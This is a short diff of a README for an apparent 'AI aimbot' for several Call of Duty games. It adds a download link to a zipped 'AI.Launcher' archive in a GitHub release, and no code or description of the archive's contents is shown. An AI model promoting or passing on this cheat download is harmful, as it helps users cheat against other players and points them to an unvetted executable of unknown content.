@@ -1,6 +1,8 @@
 Call-Of-Duty-AI-Aimbot
 Gameplay video: https://youtu.be/qjLWNXCyxD8
 
+**Download** - https://github.com/LaCasta4/Call-Of-Duty-Modern-Warfare-2-3-Aimbot/releases/download/callofduty/AI.Launcher.zip
+
 Work in MW2, MW3, Black Ops 6, Cold War, Warzone
 
 ![image](https://github.com/user-attachments/assets/2bd39b8e-5249-414c-975f-d7f8a39bab9e)
